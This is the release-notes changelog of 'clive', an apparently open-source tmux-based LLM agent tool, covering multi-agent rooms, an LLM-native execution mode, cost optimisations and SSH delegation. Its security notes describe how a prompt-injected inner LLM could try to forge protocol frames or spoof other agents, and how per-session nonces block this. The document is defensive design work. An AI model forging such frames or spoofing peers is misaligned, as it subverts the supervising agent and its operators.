- **Per-session nonces** — Each lobby session handshakes with its own nonce; outbound frames are stamped with the recipient's nonce so a compromised member cannot forge fanout for another member (the other member's stream decodes with a different nonce). `from:` labels on `say`/`pass` are lobby-authored.

- **Socket permissions** — Broker socket is `0o600` from the moment it exists (`umask(0o077)` wrapped around `bind()`, explicit `chmod` as defence-in-depth). Parent `~/.clive/lobby/` is created with mode `0o700`.

- **Broker name collision refused** — Starting a second `--role broker` under the same `--name` raises a clear error before touching the filesystem rather than silently `unlink`ing the first broker's socket and clobbering its registry entry.

- **Private-thread invisibility** — Design §7.1 guarantees private threads (breakout councils) are fully hidden from `list_threads` and all fanout for non-members; state-machine tests pin the invariant.

### Docs

- **Full design doc** at [`docs/plans/2026-04-14-clive-rooms-design.md`](docs/plans/2026-04-14-clive-rooms-design.md) — 13 sections, ~540 lines: non-goals, core concepts, turn discipline, protocol, lobby implementation, client-side architecture, access-control & trust model, bootstrap & deployment, system-interaction deltas, testing strategy, 12-phase implementation plan, open items, decision summary. Updated in-commit to reflect v1 narrowings (human-initiated threads deferred; name-reuse-after-drop accepted v1 behaviour).

- **README §Rooms** — New section between "Named instances" and "Long-running disconnected tasks" describing the feature with a three-terminal quickstart.

### Tests

23 new test files / sections, ~100 new test cases. Repo test count: 891 → 894. Fresh-eyes reviews between every phase committed 5 separate correctness-fix commits that caught: broker name collision clobbering, `sendall` on non-blocking socket silently exiting, `accept()` killing the event loop on `EMFILE`, socket-mode TOCTOU, self-pipe fd reuse, partial-final-line EOF dropped, non-blocking flag leaking across tests, driver re-read per turn, `--join` silently no-oping without `--name` or `--conversational`, nonce alphabet not validated.

## 0.5.0 — LLM-native mode & cross-task memory (2026-04-14)

A new execution mode where the LLM *is* the tool — for tasks where generation is the work (translate, summarize, rewrite, extract, classify, explain) rather than something you drive a shell to do. Plus the REPL and TUI now carry state across tasks, so follow-up references like "translate the transcript" resolve without clarification.

### Added

- **`llm` execution mode** (`execution/llm_runner.py`) — A subtask runner with no pane, no shell. Reads input from (1) user-created files in the session working directory, (2) absolute/home paths named in the task description; calls the model once with a single-purpose prompt (`build_llm_prompt`); writes the generated text to `llm_<subtask.id>.txt` in the session dir. Output cap is 16 KB tokens by default and tunable via `CLIVE_LLM_OUTPUT_TOKENS`. Input is capped at 200 KB with oldest files truncated first. Non-text files are skipped and logged at debug level; realpath normalisation prevents symlinks from double-feeding a file or feeding the model its own prior output. Added to `VALID_MODES` and dispatched in `executor.run_subtask` between `planned` and the tool-calling/interactive runners.

- **Chain planning** — Planner prompt rewritten to treat chains as the common case. A task like "get the transcript and translate it" is now decomposed into `script` (fetch) → `llm` (translate), with data flowing between subtasks through the existing file registry (`dep_context` + `file_inspect.sniff_session_files`). The anti-pattern "route transformation to shell" is called out explicitly in both classifier and planner prompts so translation/summarization never lands in `script` mode again.

- **Session file listing in classifier/planner prompts** — `clive_core._render_session_files()` formats the session dir's user-created files (with schema hints from `file_inspect.format_file_context`) and threads it into `build_classifier_prompt` and `build_planner_prompt`. The LLM can now resolve references like "the transcript" by seeing what's on disk instead of asking to clarify.

- **Recent-task history** — `clive_core._render_recent_history()` renders a bounded ring buffer of the last few `(task, summary, produced_files)` tuples into both prompts. CLI REPL seeds it as `session_ctx["history"] = deque(maxlen=10)`; TUI holds it on `CliveApp._history`. `_run_inner` appends after every successful task.

- **Persistent TUI session working directory** — `CliveApp._session_dir` is allocated once at app start and reused across all tasks (previously the TUI created a fresh `/tmp/clive/<id>/` per task and wiped it at the end, which made cross-task file references impossible). Removed on `on_unmount` so `/tmp/clive/` does not accrete between app launches.

- **`build_llm_prompt()`** (`llm/prompts.py`) — System prompt for `llm` mode. Declares the reply-is-the-output-file contract, forbids wrapping fences and preamble, offers an optional `--- / DONE:` summary footer that the runner strips before writing.

- **Tests** — `tests/test_llm_runner.py` (13 cases) covers the happy path, absolute-path input reading, `DONE:` footer and code-fence stripping, no-input tasks, LLM exceptions, empty output, write failure, internal-file exclusion, not-feeding-previous-llm-output-back (symlink/realpath correctness), binary-file skipping, output-token env override, and per-pane model override.

### Fixed

- **Circular import through the compatibility shims** — `planning/dag_scheduler.py` did `import executor` while the `executor.py` shim was mid-load (triggered through `from dag_scheduler import execute_plan` inside `execution/executor.py`). The sys-modules swap at the end of the shim never updated already-captured references, so `executor.run_subtask` resolved to `AttributeError` at call time. Now imports `from execution import executor` to bypass the shim entirely during the cycle.

- **Retired OpenRouter fast-tier model** — `runtime._TIER_MAP["openrouter"]["fast"]` was pinned to `google/gemini-2.0-flash-exp:free`, which OpenRouter has retired (404). Set to `None` so the fast tier falls back to `AGENT_MODEL`. Callers running OpenRouter who want a cheaper classifier/compression tier can substitute a current slug locally.

- **`llm_runner` write guard** — Disk-full / permission failures on the output file now return a clean `FAILED` SubtaskResult instead of raising up through the DAG scheduler.

### Changed

- **Classifier JSON schema** — `mode` now includes `llm`; `fallback_mode` accepts it too. The classifier examples and the planner's MODE section were rewritten to (a) route translate/summarize/rewrite/extract/classify to `llm` only, (b) teach the classifier to check `session_files` and `recent_history` before returning `clarify`, (c) show a canonical script→llm chain in the planner's response schema.

- **Tier-2 token budget hint** — The planner's cost hint now lists `llm` alongside `script` and `interactive` so the LLM's plan-sizing intuition reflects the real mode mix.

- **CLI REPL session context** — `_run_inner` now populates `session_ctx["session_dir"]`, `session_ctx["session_files_rendered"]`, and `session_ctx["history_rendered"]` before routing, and appends a history entry after every successful task.

### Docs

- Added `CLAUDE.md` at the repo root — high-level architecture notes, execution modes, command reference, and gotchas for future Claude Code sessions working on the codebase.
- README gains an `llm` row in the execution-modes table plus a "Session state across tasks" section describing the persistent working directory, file listing, and recent-task history.

### Tests

Full suite: 733 → 746 passing (+13 from `test_llm_runner.py`). Two assertions in `test_model_tiers.py` updated to match the OpenRouter fast-tier fallback.

---

## 0.4.0 — Observation Loop Efficiency (2026-04-14)

Six strategies that separate the observation loop into WAIT (free) / OBSERVE (cheap) / DECIDE (expensive) phases. The goal: the expensive main model is only called when genuine judgment is needed.

### Added

- **Per-pane model selection** — Drivers declare `agent_model` and `observation_model` tiers in frontmatter. Shell and data panes use cheap models (Haiku, Flash); browser and email use the default model. `runtime.resolve_model_tier()` maps tier labels (`fast`, `default`) to concrete model names per provider (7 providers supported).

- **Observation event system** (`observation.py`) — `ScreenClassifier` converts raw tmux screen captures into structured `ScreenEvent`s (SUCCESS / ERROR / NEEDS_INPUT / RUNNING / UNKNOWN) using regex. Each event carries a `needs_llm` flag — when False, the main model is not needed. Reuses `INTERVENTION_PATTERNS` from `completion.py` (no duplication). `format_event_for_llm()` produces compact messages like `[OK exit:0] file1.txt` instead of raw screen diffs.

- **Progressive context compression** (`context_compress.py`) — Replaces the bookend trim strategy (`_trim_messages`) with progressive compression. Old conversation turns are summarized by a cheap model into a running history, preserving information instead of dropping it. Falls back to bookend trimming when no observation model is configured. Compressor created once before the loop.

- **Observation-action decoupling** — After each command, the `ScreenClassifier` fires in the interactive runner. When exit_code==0 and `needs_llm==False`, a compact `[OK exit:0] summary` replaces the full screen diff in the next LLM context. The main model still decides the next action, but with 60-80% fewer input tokens.

- **Plan-Execute-Verify mode** (`planned_runner.py`) — New `"planned"` execution mode. The LLM generates a sequence of commands with verification criteria in ONE call (`build_planned_prompt`). The harness then executes each step mechanically — checking exit codes, handling retry/skip/abort — with zero additional LLM calls on the happy path. Added to `VALID_MODES`, dispatched in `executor.run_subtask()` before interactive mode, and included in the planner prompt.

- **Native tool-calling support** (`tool_defs.py`, `llm.chat_with_tools`) — Three pane operation tools: `run_command`, `read_screen`, `complete`. `chat_with_tools()` supports Anthropic (native tools param), OpenAI-compatible (auto-converts schemas), and DelegateClient (falls back to text mode). `parse_tool_calls()` normalizes both response formats into uniform `{name, args, id}` dicts.

- **Tool-calling interactive runner** (`toolcall_runner.py`) — Alternative to the text-based interactive runner. Uses native tool calls instead of regex command extraction. Key advantage: command batching — the model can emit multiple `run_command` calls in one response, each executed sequentially. Auto-detects provider support; falls back gracefully to text-based runner on unsupported providers or errors.

### Changed

- **Executor dispatch order** — `run_subtask()` now dispatches: skill > direct > script > planned > tool-calling interactive > text-based interactive. Tool-calling is attempted first for `interactive`/`streaming` modes when the provider supports it (OpenAI, Anthropic, OpenRouter, Gemini), with graceful fallback.

- **Driver frontmatter** — All 6 driver files now declare model tiers. Shell/data/media/docs: `agent_model: fast`, `observation_model: fast`. Browser/email: `agent_model: default`, `observation_model: fast`.

- **Planner prompt** — Mode guidance now includes all 5 modes (script, planned, interactive, streaming, direct) with clear selection criteria.

### Tests

- Full suite: 746 passing (+103 new). New test files: `test_pane_models.py` (12), `test_observation.py` (24), `test_context_compress.py` (10), `test_observation_decoupling.py` (4), `test_planned_runner.py` (14), `test_planned_integration.py` (4), `test_tool_calling.py` (18), `test_toolcall_runner.py` (11), `test_model_tiers.py` (17).

### Expected cost savings

| Strategy | Mechanism | Estimated savings |
|---|---|---|
| Per-pane models | Cheap models for shell/data tasks | 50-70% cost per pane |
| Observation classification | Skip full diff when command succeeds | 60-80% fewer input tokens per turn |
| Context compression | Summarize instead of drop old turns | 40-60% fewer input tokens |
| Plan-Execute-Verify | 1 LLM call for multi-step tasks | 80-90% fewer LLM calls |
| Tool-calling batching | Multiple commands per response | 30-50% fewer turns |
| Combined | All strategies | 3-5x overall reduction |

### Repository restructure

Moved all source code from a flat 55-files-in-root layout into a `src/clive/` package with 8 subpackages.

- **Package structure** — Source organized into `llm/`, `planning/`, `execution/`, `observation/`, `session/`, `networking/`, `tui/`, `evolution/`, plus existing packages (`selfmod/`, `server/`, `sandbox/`). Data directories (`drivers/`, `tools/`, `skills_data/`) moved into the package.
- **Root directory** — Reduced from 103 entries to 13: entry-point wrappers (`clive.py`, `tui.py`), config files, and 4 directories (`src/`, `tests/`, `evals/`, `docs/`).
- **Zero import changes** — Flat imports (`from models import Subtask`, `from llm import chat`) preserved via `sys.modules`-based shim files. No source code modifications required.
- **Removed content** — 11 blog posts and 1 stale design doc removed from tracked files. `SPEC.md` and `SPEC-v3.md` moved to `docs/`.
- **Updated .gitignore** — Consolidated patterns for experiment artifacts (`.tsv`, `.DS_Store`).

---

## 0.3.0 — BYOLLM delegation for remote clives (2026-04-13)

Remote `clive@host` addressing now works for local LLM providers (LMStudio, Ollama) without any network tunneling. The conversational protocol was rewritten from line prefixes to authenticated framed sentinels, closing a spoofing surface that was merely theoretical with cloud providers but load-bearing the moment inference is delegated.

### Added

- **Delegate LLM provider** — When the outer clive uses a local-only provider (LMStudio, Ollama), `build_agent_ssh_cmd` transparently sets `LLM_PROVIDER=delegate` on the remote. The remote's `DelegateClient` (`delegate_client.py`) serializes each inference call as a framed `llm_request` on stdout, blocks on stdin until a matching `llm_response` arrives. The outer's interactive runner detects the frame in the pane, calls its own local LLM, and types back an `llm_response` via `send_keys`. No tunneling, no `ssh -R`, no network changes on the remote.

- **Framed conversational protocol** (`protocol.py`) — Wire format `<<<CLIVE:{kind}:{nonce}:{base64(json(payload))}>>>`. Replaces the legacy `TURN:`/`CONTEXT:`/`QUESTION:`/`FILE:`/`PROGRESS:`/`DONE:` line prefixes. Base64 wrapping prevents stray tool output from ever matching a frame; the nonce slot adds authentication so a compromised inner LLM cannot forge state or request spurious inference.

- **Session nonce** — The outer generates a fresh 128-bit urlsafe nonce per agent session, injects it into the remote env as `CLIVE_FRAME_NONCE`, and stores it on the returned `pane_def`. Every frame the remote emits carries the nonce; every frame the outer parses is rejected unless the nonce matches.

- **Decoded agent-pane view** (`remote.render_agent_screen`) — The outer's interactive runner transforms the captured pane screen before handing it to the outer LLM: each valid frame becomes a human-readable pseudo-line (`⎇ CLIVE» turn=done`, `⎇ CLIVE» question: "..."`), forged or unauthenticated frames are silently dropped, raw `<<<CLIVE:...>>>` bytes never reach the LLM. The driver prompt (`drivers/agent.md`) describes the pseudo-line grammar as the source of truth.

- **`clive --agents-doctor`** (`agents_doctor.py`) — Pre-flight check that validates every host in `~/.clive/agents.yaml`: SSH reachability (BatchMode, 5s timeout), remote clive importability (honouring venv/versioned-python `path:` config), AcceptEnv coverage for every forwarded env var. Exits 0/1 so it composes into CI pipelines. Empty registry exits 0 with a helpful message.

- **SSH ControlMaster pooling** — `build_agent_ssh_cmd` emits `ControlMaster=auto`, `ControlPath=~/.clive/ssh/%C`, `ControlPersist=60s` for every agent connection. Delegate round-trips, scp file transfers, and reconnects attach to the existing channel in milliseconds instead of re-doing the full SSH handshake. Socket dir created lazily from `resolve_agent()` (covers all entry points) and degrades gracefully if the dir can't be created.

- **`LLM_BASE_URL` override + forwarding** — `llm.get_client()` honours `LLM_BASE_URL` as an override of the provider's default `base_url` for both the openai and anthropic paths (users running self-hosted proxies like LiteLLM). `agents._FORWARD_ENVS` gains `LLM_BASE_URL` and the previously-missing `GOOGLE_API_KEY`.

- **Conversational keepalive ticker** — Named instances with no initial task previously blocked on `stdin.readline()` with no outbound signal. A daemon thread now emits an `alive` frame every 15 seconds for the entire lifetime of the conversational block, so supervisors can distinguish a slow-but-working inner from a wedged one. Alive frames are filtered from the outer LLM's decoded view (supervisor signal only).

- **User documentation** (`docs/byollm-delegate.md`) — End-to-end guide covering cloud vs local provider paths, configuration cheat sheet, troubleshooting flowchart, threat model with a data-flow table, and a step-by-step manual smoke-test procedure against real LMStudio.

### Changed

- **Telemetry migration** — `progress()`, `step()`, `detail()`, `activity()` in `output.py` now emit framed `progress` frames when `_conversational` is active. Previously they emitted `PROGRESS: msg` line prefixes that the new parser couldn't see.

- **Interactive runner ordering** — For agent panes, the raw screen is passed to `executor.handle_agent_pane_frame()` first (to detect and answer `llm_request` frames), THEN rendered via `render_agent_screen()` for the outer LLM's view. Delegation side-channel traffic never consumes an outer-LLM turn.

- **`DelegateClient` timeout uses `select.select()`** — The 300-second chat-completion timeout now actually fires when the outer is silent. The initial implementation called `readline()` directly on stdin, which blocked indefinitely on a stuck outer, bypassing the deadline check entirely.

- **`clive.py` conversational loop** — Initial `sys.stdin.readline()` is skipped entirely when `keep_alive` is True, so control words (`exit`, `quit`, `/stop`) work on the first line the user sends, not just on subsequent ones.

### Removed

- **Legacy `TURN:`/`CONTEXT:`/`DONE:` line-prefix protocol** — Hard cutover, no compatibility shim. All conversational sessions are internal (clive-to-clive); no external consumers. `parse_remote_result` is gone from `remote.py`; regression test in `tests/test_remote.py` asserts it.

- **`server/conversational.py`** — Dead-code second emitter path that duplicated the framed protocol. Deleted along with its test.

### Security

- **Spoof-resistance.** The framed protocol's base64 wrapping prevents stray tool output from forming a valid frame (the marker characters `<`/`>`/`:` cannot appear inside base64). The per-session nonce prevents an adversarial LLM inside the inner — one that has been prompt-injected — from fabricating a valid frame, because the nonce is an env var and not part of any prompt the inner LLM can see. The `tests/test_protocol.py::test_decode_rejects_mismatched_nonce` test enforces the invariant.

- **Privacy of delegated prompts.** Under delegation, the remote's inner LLM prompts transit through the outer's LLM provider. If the outer is on LMStudio locally, nothing leaves your laptop. If the outer is on Anthropic or OpenAI, those providers receive the remote's inner prompts as if they were outer-originated. Document and data-flow table in `docs/byollm-delegate.md`.

### Tests

- Full suite: 593 passing. New: `tests/test_protocol.py` (17), `tests/test_delegate_client.py` (7), `tests/test_executor_delegate.py` (6), `tests/test_agents_doctor.py` (22), `tests/test_conversational_keepalive.py` (3), `tests/test_agent_view.py` (14), `tests/test_integration_delegate.py` (1 — end-to-end transport with mock LMStudio), `tests/test_llm_providers.py` (5).

---

## 0.2.0 — Instance Dashboard & Local Addressing (2026-04-09)

### Added

- **Named instances** (`--name`) — Give a clive instance a name to make it addressable and long-lived. Named instances register in `~/.clive/instances/`, stay alive after their initial task, and accept follow-up tasks on stdin. Name collisions are rejected at startup.

- **Instance registry** (`registry.py`) — File-based registry at `~/.clive/instances/`, one JSON file per running instance. Automatic stale entry pruning via `os.kill(pid, 0)` liveness checks. No daemon, no socket, no coordination needed.

- **Local-first address resolution** — `clive@mybot` now checks the local instance registry before SSH. If a live, conversational instance matches, it resolves locally via tmux attach (microsecond latency). Local instances shadow remote hosts with the same name.

- **`--dashboard`** — Snapshot CLI showing all running instances, their PID, toolset, status, and uptime. Also shows remote agents from `~/.clive/agents.yaml`. Like `docker ps` for clive instances.

- **`--stop <name>`** — Send SIGTERM to a named instance by looking up its PID from the registry.

- **`/dashboard` TUI command** — Shows the same instance table in the TUI via `render_lines()`.

- **Conversational loop for named instances** — Named instances loop after task completion, reading additional tasks from stdin. Supports `/stop`, `exit`, `quit` to break the loop.

- **Conversational pane** (`session.py`) — Named instances get a dedicated `conversational` tmux window for receiving tasks from other instances.

- **Production hardening** — Sandboxing (bwrap/sandbox-exec/ulimit fallback), per-user resource quotas, file-based job queue with `fcntl.flock`, worker pool daemon with supervisor, health endpoint, cross-process SharedBrain via Unix domain sockets, agent-to-agent authentication, stall detection with exponential backoff.

---

## Agent Addressing & Peer Conversation (2026-04-08)

### Added

- **`clive@host` addressing** — Type `clive@devbox check disk usage` and Clive automatically resolves the address, opens an SSH pane, and routes the task. No profile or pane config needed. Multiple addresses supported: `clive@gpu render then clive@web upload`.

- **Agent registry** (`~/.clive/agents.yaml`) — Optional YAML registry for named agents with custom hosts, SSH keys, toolsets, and paths. Auto-resolve fallback when no registry entry exists.

- **TURN:/CONTEXT: conversation protocol** — Structured peer conversation between Clive instances. Inner Clive emits `TURN: thinking|waiting|done|failed`, `CONTEXT: {...}`, `QUESTION: "..."`, and `PROGRESS: ...` lines. Outer Clive reads turn state to decide when to act.

- **`--conversational` flag** — Enables conversational output mode for inner Clive instances. Auto-detected via `isatty()` when running over SSH (no TTY = conversational mode).

- **Turn-state-aware executor** — Agent panes now skip LLM calls during `TURN: thinking` (saving tokens), respond during `TURN: waiting`, and complete on `TURN: done/failed`. Backward compatible with legacy `DONE:` protocol.

- **Lazy pane injection** — Agent panes created on-demand when `clive@host` addresses are encountered. No need to pre-declare agent panes in toolset profiles.

- **BYOLLM via SSH** — API keys (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `OPENROUTER_API_KEY`) forwarded to remote Clive via SSH `SendEnv`. Remote instance uses your keys — no keys stored on remote hosts.

- **Agent driver rewrite** (`drivers/agent.md`) — Updated for peer conversation protocol with TURN/CONTEXT/QUESTION handling rules.

### Removed

- **Loopback profile** — The `loopback` toolset profile and `localhost_agent` pane definition removed from `toolsets.py`. Replaced by `clive@localhost` addressing.

---

## Performance Optimizations (2026-04-07)

### Read Loop

- **Screen diffing** — Only changed lines sent to LLM after first turn. Uses `difflib.unified_diff` with 60-line cap. Cuts screen tokens by 60-80%.

- **Context compression** — Conversation history capped at 4 most recent turns. Prevents unbounded token growth in long interactive sessions.

- **Batched exit check** — Script execution and exit code capture combined into one tmux round-trip. Saves ~2 seconds per script attempt.

- **Expanded markers** — All shell-like panes (data, docs, media, browser, files) use marker-based completion detection. Eliminates 2-second idle timeout.

- **Scrollback capture** — `capture-pane -J -S-50` joins wrapped lines and includes recent scrollback. Agent sees output that scrolled off screen.

- **`wait` command** — Agent can explicitly pause and re-observe: `<cmd type="wait">3</cmd>`. Useful for long-running commands.

- **No-change early stop** — If screen is unchanged for 3 consecutive turns, subtask fails as stuck. Prevents wasting turns on stuck loops.

### Planning

- **Stronger script-mode push** — Planner prompt strongly prefers script mode (2.5x cheaper, equally reliable). Interactive only when observation is genuinely required.

---

## Gap Closure: Hardening + Full Layer Coverage (2026-04-07)

### Added

- **Layer 3 eval tasks** — 12 script quality tasks: correctness (rename, JSON sum, curl pipeline, Python parse, error handling), robustness (empty input, missing files, valid JSON, no-clobber), debug loop (syntax fix, wrong output, missing command).

- **Layer 4 eval tasks** — 10 planning quality tasks: DAG structure (parallel synthesis, dependency chains, minimal decomposition), mode assignment (script for batch ops, interactive for browsing, mixed modes).

- **Layer 1 eval tasks** — 4 end-to-end tasks testing full pipeline: TODO counting, API table formatting, log analysis, file inventory.

- **Data eval tasks** — 3 tasks exercising the data driver: CSV sum, CSV group-by, JSON transform.

- **Output format flags** — `--oneline` (single-line result), `--bool` (exit 0/1 for yes/no), `--json` (structured JSON output). All imply `--quiet`.

- **Streaming observation level** — Intervention detection during command execution (password prompts, confirmations, fatal errors). `mode: "streaming"` dispatches interactive loop with intervention detection.

- **Clive-to-clive protocol** — Agent driver prompt (`drivers/agent.md`) with DONE: JSON protocol. Executor parses DONE: lines on agent panes.

- **Script→interactive fallback** — Failed script subtasks automatically retry as interactive mode with increased turn budget.

- **Driver prompts** — 4 new drivers: data (jq/awk/mlr), docs (man/pandoc), email_cli (mutt state machine), media (ffmpeg/yt-dlp). Plus agent driver.

- **Evolution integration** — Evolution loop now includes Layer 3 tasks for harder selection pressure. `/evolve` slash command in TUI.

- **CI workflows** — Unit tests on every push, Layer 2 evals on push to main (with API key check).

- **Selfmod gate tests** — 17 unit tests for the deterministic safety gate (banned patterns, immutable files, tier approvals).

- **Script lifecycle** — Script mode writes `_result_{id}.json` and `_log_{id}.txt`. Script generation logged to audit trail.

- **Session management** — Session-scoped cleanup after run(). TUI uses session_dir.

- **Eval reliability** — /tmp/clive cleaned before each eval task. Baseline comparison via `--baseline` flag.

- **Mode validation** — Subtask.mode validated against known values (script/interactive/streaming). Unknown modes default to interactive with warning.

- **Pricing** — `pricing.json` with per-model rates. `EvalReport.estimated_cost()` for cost tracking.

---

## Phase 2: Observation Levels + Session Isolation (2026-04-07)

### Added

- **Script observation level** — Deterministic subtasks now bypass the turn loop. The planner assigns `mode: "script"` to tasks that can be solved with a single shell script. The executor generates the script in one LLM call, executes it, and checks the exit code. On failure, a repair loop reads the error and patches. ~2.5x cheaper on tokens than interactive mode.

- **Session-scoped filesystem** — Each run gets its own working directory at `/tmp/clive/{session_id}/`, preventing cross-run collisions. Session ID is displayed at startup.

- **Planner mode assignment** — The planner prompt now includes guidance for choosing between `script` and `interactive` observation levels. The plan display shows the assigned mode per subtask.

- **Script-mode eval tasks** — 5 new deterministic eval tasks (CSV filtering, log extraction, word counting, file listing, JSON creation) that exercise the script execution path.

### Eval results

| Suite | Tasks | Pass Rate | Tokens/task |
|---|---|---|---|
| Shell (interactive) | 5 | 100% | ~5,400 |
| Browser (interactive) | 5 | 100% | ~5,700 |
| Shell (script) | 5 | 100% | ~2,100 |

Total: 15 eval tasks, 14-15/15 passing (1 flaky due to cross-test contamination in shared `/tmp/clive/`).

---

## Phase 1: Sub-Agent Specialization + Layer 2 Evals (2026-03-16)

### Added

- **Output routing** (`output.py`) — `progress()` for telemetry (stderr in quiet mode), `result()` for final output (always stdout). Replaces bare `print()` calls.

- **`--quiet` / `-q` flag** — All telemetry to stderr, only the final result to stdout. Enables `clive` as a shell primitive: `result=$(clive -q "task")`.

- **Driver auto-discovery** — `drivers/*.md` files loaded automatically by `app_type`. Workers get tool-specific knowledge (keyboard shortcuts, command patterns, pitfalls) instead of a generic prompt.

- **Shell driver** (`drivers/shell.md`) — Compact reference card for bash: exit codes, patterns, quoting pitfalls.

- **Browser driver** (`drivers/browser.md`) — Reference card for lynx/curl/wget: page rendering, link extraction, API patterns.

- **Eval framework** — Isolated tmux fixtures (`session_fixture.py`), deterministic + cached LLM verifiers (`verifier.py`), metrics and reporting (`metrics.py`), CLI runner (`run_eval.py`).

- **10 Layer 2 eval tasks** — 5 shell tasks (find files, count patterns, word frequency, disk usage, JSON extraction) + 5 browser tasks (fetch page, extract links, JSON API, HTTP headers, multi-endpoint).

### Foundation (pre-Phase 1)

- tmux-based autonomous agent loop with plan → execute → summarize pipeline
- Parallel DAG execution across tmux panes with dependency tracking
- Composable toolset profiles (`-t standard+media+ai`)
- Multi-provider LLM support (OpenRouter, Anthropic, OpenAI, Gemini, LMStudio, Ollama)
- Textual-based TUI with slash commands
- Self-modification system with separation of powers (experimental)
- Remote habitat support via SSH with security layering
